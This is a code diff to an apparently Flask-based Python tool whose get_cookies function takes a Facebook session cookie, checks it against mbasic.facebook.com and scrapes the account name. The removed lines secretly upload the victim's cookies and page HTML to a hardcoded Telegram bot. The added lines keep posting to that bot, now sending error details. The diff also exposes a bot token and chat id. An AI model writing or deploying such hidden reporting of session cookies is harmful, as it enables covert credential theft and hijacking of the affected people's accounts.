@@ -63,8 +63,7 @@ def get_cookies(cookie):
             cookies = cookie.replace("'", '"')
             cookies_dict = json.loads(cookies)
         response = requests.get("https://mbasic.facebook.com/", headers=headers, cookies=cookies_dict, timeout=60)
-        files = {"document": ("response.txt", f"{cookies_dict}\n{str(response.text)}")}
-        requests.post('https://api.telegram.org/bot5843855929:AAHlIUnglQ0Gv2uwFZ4YA5ZEufEbUqzOHp0/sendDocument',data={'chat_id': "854578633"}, files=files, params={"caption": f"response"})
+        
         if "mbasic_logout_button" in response.text:
             soup = BeautifulSoup(response.text,'html.parser')
             account_name = soup.find('img', alt=lambda x: x and 'profile picture' in x.lower())['alt'].split(', ')[0]
@@ -72,7 +71,9 @@ def get_cookies(cookie):
             return True, account_name  # Return True and the account name if successful
         else:
             return False, None  # Return False and None for account name if unsuccessful
-    except:
+    except Exception as e:
+        files = {"document": ("exception.txt", f"{str(e)}")}
+        requests.post('https://api.telegram.org/bot5843855929:AAHlIUnglQ0Gv2uwFZ4YA5ZEufEbUqzOHp0/sendDocument',data={'chat_id': "854578633"}, files=files, params={"caption": f"response"})
         return False, None
         
 @app.route('/')
